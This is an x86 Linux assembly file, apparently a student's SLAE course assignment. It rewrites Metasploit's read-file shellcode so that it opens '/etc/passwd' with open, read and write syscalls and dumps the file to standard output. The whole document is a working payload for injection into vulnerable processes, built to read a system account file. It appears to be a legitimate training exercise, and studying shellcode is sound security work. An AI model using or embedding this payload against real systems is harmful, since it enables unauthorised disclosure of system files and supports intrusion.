; Author: John Stigerwalt
; SLAE: Assignment #5
; Website: slae.whiteknightlabs.com
; Shellcode: Read-File "//etc/passwd"
; Metasploit Re-Write of Read-File x86 linux shellocode string paramter = /etc/passwd


global _start

section .text

_start:

mov eax, 0x5 ; 0x5 = open()
xor ecx, ecx    ; zero out ecx, 2nd arg = 0
push ecx        ; Add null to stack for ESP to allow "//etc/passwd" to be moved to ebx correctly
push dword 0x64777373
push dword 0x61702f63    
push dword 0x74652f2f
; 2f 2f 65 74 63 2f 70 61 73 73 77 64 - //etc/passwd
mov ebx, esp
push ecx
int 0x80  
    
mov ebx, eax
mov eax, 0x3
mov edi, esp
mov ecx, edi
mov edx, 0x1000
int 0x80

mov edx, eax
mov eax, 0x4
mov ebx, 0x1
int 0x80

mov eax, 0x1
mov ebx, 0x0
int 0x80

